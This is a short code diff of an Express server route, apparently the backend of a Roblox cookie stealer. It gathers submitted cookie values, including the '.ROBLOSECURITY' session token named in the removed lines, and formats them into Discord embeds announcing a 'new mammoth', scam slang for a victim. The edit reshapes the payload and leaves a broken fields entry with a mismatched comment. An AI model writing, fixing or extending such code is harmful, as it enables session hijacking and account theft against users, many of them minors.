@@ -18,29 +18,24 @@ app.post('/send', async (req, res) => {
         const reqBody = req.body;
         const fieldsArray = [];
         let index = 0;
-
+        let embds = []
         // Перебираем ключ-значение из тела запроса
         for (const key in reqBody) {
             if (Object.prototype.hasOwnProperty.call(reqBody, key)) {
                 index++;
-                fieldsArray.push({
-                    name: `Куки ${index}`,       // Имя поля в эмбеде
-                    value: `${key}: ${reqBody[key]}` // Показываем и ключ, и его значение
-                });
+                embds.push({
+                    title: `Куки ${index}`,
+                    description: key,
+                    color: 5814783,
+                    fields: [''] // Передаем готовый массив объектов
+                })
             }
         }
 
         // Формируем правильную структуру для Discord
         const discordPayload = {
             content: "Новый мамонт!",
-            embeds: [
-                {
-                    title: ".ROBLOSECURITY",
-                    description: "М",
-                    color: 5814783,
-                    fields: fieldsArray // Передаем готовый массив объектов
-                }
-            ],
+            embeds: embds,
             attachments: []
         };
 
